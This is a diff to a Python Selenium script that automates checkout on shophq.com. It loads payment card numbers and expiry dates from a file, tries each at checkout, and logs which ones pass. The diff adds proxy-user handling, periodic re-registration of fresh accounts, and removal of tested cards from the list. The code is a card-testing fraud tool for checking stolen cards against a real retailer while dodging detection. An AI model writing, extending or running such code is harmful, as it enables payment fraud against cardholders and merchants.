@@ -419,7 +419,9 @@ def save_result_pass(line):
 def save_result_fail(line):
 	with open(current_folder+'/result_fail.txt', 'a') as f:
 		f.write('\n'+ line)
-def getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone):
+def getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone,check_add_creadit):
+	
+	
 	page_loading= True
 	while page_loading:
 		page_loading = browser.page_loading()
@@ -439,37 +441,38 @@ def getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,l
 			browser.turn_off_modal(by=By.CLASS_NAME,value='pdp-promo-modal')
 			quick_buy_check =False
 			print('ok continue')
-	page_loading= True
-	while page_loading:
-		page_loading = browser.page_loading()
+	if check_add_creadit :
+		page_loading= True
+		while page_loading:
+			page_loading = browser.page_loading()
 
-		if page_loading==False :
-			curentUrl = browser.browser.current_url
-			if 'shophq.com/Checkout/QuickBuy' in curentUrl:
-				# try:
-				print(check_box_exist_info)
-				if check_box_exist_info == "0" or check_box_exist_info ==0:
-					browser.turn_off_modal(by=By.CLASS_NAME,value='pdp-promo-modal')
-					action_add_ship_address(browser,email,password,first_name,last_name,address,city,state,zip_code)		
-					time.sleep(3)
-					# except :
-						
-					# 	print('Da co thong tin ship address')
+			if page_loading==False :
+				curentUrl = browser.browser.current_url
+				if 'shophq.com/Checkout/QuickBuy' in curentUrl:
 					# try:
-					browser.turn_off_modal(by=By.CLASS_NAME,value='pdp-promo-modal')
-					action_add_bill_address(browser,email,password,address,city,state,zip_code,phone)	
-					time.sleep(3)
-				# except:
-				# 	print('Da co thong tin bill address')
-			elif 'https://www.shophq.com/Account/Login' in curentUrl:
-				try:
-					action_login(browser,email,password)
-				except:
-					print('Not')
-			else:
-				time.sleep(6)
-				print('Not make order')
-		time.sleep(3)
+					print(check_box_exist_info)
+					if check_box_exist_info == "0" or check_box_exist_info ==0:
+						browser.turn_off_modal(by=By.CLASS_NAME,value='pdp-promo-modal')
+						action_add_ship_address(browser,email,password,first_name,last_name,address,city,state,zip_code)		
+						time.sleep(3)
+						# except :
+							
+						# 	print('Da co thong tin ship address')
+						# try:
+						browser.turn_off_modal(by=By.CLASS_NAME,value='pdp-promo-modal')
+						action_add_bill_address(browser,email,password,address,city,state,zip_code,phone)	
+						time.sleep(3)
+					# except:
+					# 	print('Da co thong tin bill address')
+				elif 'https://www.shophq.com/Account/Login' in curentUrl:
+					try:
+						action_login(browser,email,password)
+					except:
+						print('Not')
+				else:
+					time.sleep(6)
+					print('Not make order')
+			time.sleep(3)
 def run():
 	urls = []
 
@@ -510,7 +513,7 @@ def run():
 			list_creadit.append([number, month, year])
 	with open(current_folder+'/proxy.txt', 'r') as f:
 		for line in f:
-			check_proxy, proxy = line.strip().split('|')
+			check_proxy,check_proxy_user, proxy = line.strip().split('|')
 			check_proxy = check_proxy.replace(' ','')
 			proxy= proxy.replace(' ','')
 
@@ -531,22 +534,28 @@ def run():
 	
 	# go to product and Buy
 	print(browser.browser.current_url)
-	getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone)
+	getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone,True)
 	
-	for i in range(len(list_creadit)):
+	for i in range(len(list_creadit)-1,-1,-1):
 		# try:
-		if i!=0 and i % 100==0:
+		check_add_creadit = True
+		if i == len(list_creadit)-1:
+			check_add_creadit = False
+		if i!=len(list_creadit)-1 and i % 50==0:
 			while True:
 				if browser.page_loading() :
 					time.sleep(4)
 				else:
 					break
 			action_register(browser)
-			getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone)
+			check_add_creadit = False
+			getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone,check_add_creadit,True)
+			
 		number = list_creadit[i][0]
 		month = list_creadit[i][1]
 		year = list_creadit[i][2]
 		time.sleep(3)
+		
 		while True:
 			try:
 				action_add_creadit(browser,number,month,year)
@@ -594,7 +603,7 @@ def run():
 			print('thanh toan duoc không hiện lỗi')
 			line= f'{number}|{month}|{year}|pass'
 			save_result_pass(line)
-			getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone)
+			getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone,False)
 		print('Current iframe',browser.browser.current_url)
 		browser.browser.switch_to.default_content()
 		wait = WebDriverWait(browser.browser, 30)
@@ -608,5 +617,12 @@ def run():
 		# 	line= f'{number}|{month}|{year}|pass'
 		# 	save_result_pass(line)
 		# 	getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone)
+		list_creadit.pop(-1)
+	
+
+		# Write the updated list back to the file
+		with open(current_folder + '/credit.txt', 'w') as f:
+			for item in list_creadit:
+				f.write('|'.join(item) + '\n')
 	browser.close_browser()
 	
